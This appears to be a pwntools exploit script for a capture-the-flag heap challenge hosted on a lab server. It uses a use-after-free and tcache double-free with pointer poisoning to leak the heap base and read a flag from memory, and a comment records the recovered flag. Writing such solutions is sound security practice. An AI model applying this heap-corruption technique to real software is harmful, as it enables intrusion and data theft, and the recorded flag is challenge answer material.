from pwn import *

# p = process('./chal')
p = remote('10.113.0.1', 10602)

def add(idx, length):
    p.sendlineafter(b'choice: ', b'1')
    p.sendlineafter(b'Index: ', str(idx).encode())
    p.sendlineafter(b'Length: ', str(length).encode())

def write(idx, data):
    p.sendlineafter(b'choice: ', b'3')
    p.sendlineafter(b'Index: ', str(idx).encode())
    p.sendafter(b'Content: ', data)

def delete(idx):
    p.sendlineafter(b'choice: ', b'4')
    p.sendlineafter(b'Index: ', str(idx).encode())

def read(idx, len):
    p.sendlineafter(b'choice: ', b'2')
    p.sendlineafter(b'Index: ', str(idx).encode())
    p.recvuntil(f'Note[{idx}]:\n'.encode())
    return p.recv(len)

def leak_addr_oct(addr):
    add(2, 0x30)
    add(6, 0x30) # solve cnt = 0 problem
    delete(6)
    delete(2)
    write(2, p64(0)*2) # prevent crash
    delete(2)
    add(3, 0x30)
    write(3, p64(addr))
    add(4, 0x30)
    add(5, 0x30)
    return read(5, 0x30)

# UAF to leak first
add(1, 0x30)
delete(1)
leak = read(1, 0x10)[8:16]
heap_base = u64(leak) - 0x10
info(f'Heap base: {hex(heap_base)}')

# note you don't just put flag addr
# as tcache will zero out the later bytes
flag_addr = heap_base + 0x2a0
add(1, 0x30) # clean tcache

# run several times each 8 bytes
# flag{e4sy-double-free}
#print(leak_addr_oct(flag_addr + 0x0))
#print(leak_addr_oct(flag_addr + 0x8))
#print(leak_addr_oct(flag_addr + 0x10))
#print(leak_addr_oct(flag_addr + 0x18))

# or you can just do it in one go by pointing to lower addr
flag_addr_lower = flag_addr - 0x10
leaked_flag = leak_addr_oct(flag_addr_lower)
print(leaked_flag)  # first 16 bytes
